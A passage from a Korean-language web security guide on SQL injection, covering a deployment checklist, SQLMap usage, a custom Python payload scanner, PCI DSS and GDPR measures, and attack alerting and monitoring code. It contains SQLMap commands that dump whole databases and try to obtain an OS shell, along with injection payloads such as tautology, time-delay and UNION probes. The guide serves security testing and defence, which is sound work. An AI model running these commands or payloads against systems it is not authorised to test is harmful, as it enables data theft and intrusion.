3. 관리자 권한 계정으로 애플리케이션 연결 금지
4. 프로덕션 환경에서 디버그 모드 사용 금지
```

#### 4.9.2. 보안 검토 체크리스트
```markdown
## 코드 배포 전 보안 체크리스트

### 데이터베이스 접근 코드
- [ ] 모든 쿼리가 매개변수화되어 있는가?
- [ ] 동적 쿼리 생성 시 적절한 검증이 있는가?
- [ ] 에러 처리가 안전하게 구현되어 있는가?
- [ ] 로깅이 적절히 구현되어 있는가?

### 입력 검증
- [ ] 모든 사용자 입력에 대한 검증이 있는가?
- [ ] 화이트리스트 기반 검증을 사용하는가?
- [ ] 입력 길이 제한이 설정되어 있는가?
- [ ] 특수문자에 대한 처리가 있는가?

### 데이터베이스 설정
- [ ] 최소 권한 원칙이 적용되어 있는가?
- [ ] 위험한 함수가 비활성화되어 있는가?
- [ ] 네트워크 접근이 제한되어 있는가?
- [ ] 암호화 연결이 사용되고 있는가?
```

### 4.10. 자동화 도구 활용

#### 4.10.1. SQLMap 활용법
```bash
# 기본 스캔
sqlmap -u "http://target/page?id=1" --batch

# 심화 스캔
sqlmap -u "http://target/page" \
       --data="username=admin&password=test" \
       --level=5 \
       --risk=3 \
       --batch

# 특정 기법만 사용
sqlmap -u "http://target/page?id=1" \
       --technique=U \  # Union-based만
       --batch

# 데이터 추출
sqlmap -u "http://target/page?id=1" \
       --dump-all \
       --batch

# 쉘 획득 시도
sqlmap -u "http://target/page?id=1" \
       --os-shell \
       --batch
```

#### 4.10.2. 커스텀 스캔 스크립트
```python
import requests
import time
import random

class CustomSQLInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.payloads = [
            "'", '"', "';", '";', 
            "' OR '1'='1", '" OR "1"="1',
            "' AND SLEEP(3)--", '" AND pg_sleep(3)--',
            "' UNION SELECT NULL--", '" UNION SELECT NULL--'
        ]
    
    def scan_parameter(self, param_name, param_value):
        results = []
        
        for payload in self.payloads:
            test_value = param_value + payload
            
            start_time = time.time()
            try:
                response = self.session.get(self.target_url, params={
                    param_name: test_value
                })
                end_time = time.time()
                
                # 시간 기반 탐지
                if end_time - start_time > 3:
                    results.append({
                        'type': 'Time-based',
                        'payload': payload,
                        'response_time': end_time - start_time
                    })
                
                # 에러 기반 탐지
                error_indicators = [
                    'sql syntax', 'mysql_fetch', 'ora-', 
                    'microsoft ole db', 'postgresql'
                ]
                
                if any(indicator in response.text.lower() for indicator in error_indicators):
                    results.append({
                        'type': 'Error-based',
                        'payload': payload,
                        'error': True
                    })
                    
            except Exception as e:
                print(f"Request failed for {payload}: {e}")
            
            # 요청 간 지연
            time.sleep(random.uniform(0.5, 1.5))
        
        return results
    
    def generate_report(self, scan_results):
        if scan_results:
            print(f"[VULNERABLE] SQL Injection detected in {self.target_url}")
            for result in scan_results:
                print(f"  - Type: {result['type']}, Payload: {result['payload']}")
        else:
            print(f"[SAFE] No SQL Injection vulnerabilities detected")
```

### 4.11. 규정 준수 및 컴플라이언스

#### 4.11.1. GDPR 준수 사항
```markdown
## 개인정보보호 관련 SQL Injection 대응

### 데이터 최소화
- 필요한 데이터만 수집 및 저장
- 개인정보 필드에 대한 추가 보안 조치
- 데이터 보관 기간 제한 설정

### 데이터 보호 조치
- 개인정보 필드 암호화 저장
- 접근 로그 및 감사 추적 구현
- 데이터 유출 시 즉시 신고 체계
```

#### 4.11.2. PCI DSS 준수 사항
```sql
-- 신용카드 정보 보호
-- 카드 번호 마스킹
SELECT CONCAT(LEFT(card_number,4),'****-****-',RIGHT(card_number,4)) AS masked_card
FROM credit_cards;

-- CVV 저장 금지 (테이블 설계 시)
CREATE TABLE credit_cards (
    id INT PRIMARY KEY,
    card_number_hash VARCHAR(255), -- 해시로만 저장
    expiry_date DATE,
    -- cvv는 저장하지 않음
    created_at TIMESTAMP
);
```

### 4.12. 모니터링 및 알림 시스템

#### 4.12.1. 실시간 알림 설정
```python
import smtplib
from email.mime.text import MIMEText

class SecurityAlertSystem:
    def __init__(self, smtp_server, smtp_port, email_user, email_pass):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email_user = email_user
        self.email_pass = email_pass
    
    def send_sql_injection_alert(self, attack_details):
        subject = "🚨 SQL Injection Attack Detected"
        body = f"""
        SQL Injection 공격이 탐지되었습니다.
        
        시간: {attack_details['timestamp']}
        IP: {attack_details['ip']}
        페이로드: {attack_details['payload']}
        대상 URL: {attack_details['url']}
        User-Agent: {attack_details['user_agent']}
        
        즉시 확인 및 조치가 필요합니다.
        """
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = self.email_user
        msg['To'] = "security-team@company.com"
        
        with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
            server.starttls()
            server.login(self.email_user, self.email_pass)
            server.send_message(msg)
```

#### 4.12.2. 대시보드 및 메트릭
```javascript
// 보안 대시보드용 메트릭 수집
const securityMetrics = {
    // SQL Injection 공격 시도 통계
    sqlInjectionAttempts: {
        total: 0,
        blocked: 0,
        today: 0,
        thisWeek: 0,
        topAttackers: []
    },
    
    // 실시간 모니터링
    trackSQLInjectionAttempt: function(ip, payload, blocked) {
        this.sqlInjectionAttempts.total++;
        if (blocked) this.sqlInjectionAttempts.blocked++;
        
        // 공격자 IP 추적
        const attacker = this.sqlInjectionAttempts.topAttackers.find(a => a.ip === ip);
        if (attacker) {
            attacker.count++;
        } else {
            this.sqlInjectionAttempts.topAttackers.push({ip, count: 1});
        }
        
        // 알림 발송
        if (this.shouldSendAlert(ip)) {
            this.sendSecurityAlert(ip, payload);
        }
    },
    
    shouldSendAlert: function(ip) {
        // 같은 IP에서 1분 내 3회 이상 시도 시 알림
        const recentAttempts = this.getRecentAttempts(ip, 60);
        return recentAttempts >= 3;
    }
};
```

---

## 참고 자료

### 추가 학습 자료
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

### 유용한 도구
- **SQLMap**: 자동화된 SQL Injection 도구
- **Burp Suite**: 웹 애플리케이션 보안 테스팅 플랫폼
- **OWASP ZAP**: 오픈소스 보안 스캐너
- **NoSQLMap**: NoSQL Injection 테스팅 도구
- **jSQL Injection**: GUI 기반 SQL Injection 도구

### 데이터베이스별 참고 문서
- **MySQL**: [MySQL Security Guidelines](https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html)
- **PostgreSQL**: [PostgreSQL Security](https://www.postgresql.org/docs/current/security.html)
- **Microsoft SQL Server**: [SQL Server Security](https://docs.microsoft.com/en-us/sql/relational-databases/security/)
- **Oracle**: [Oracle Database Security Guide](https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/)

---

*본 가이드는 웹 애플리케이션 보안 테스팅 목적으로만 사용되어야 하며, 악의적인 공격에 사용해서는 안 됩니다.*
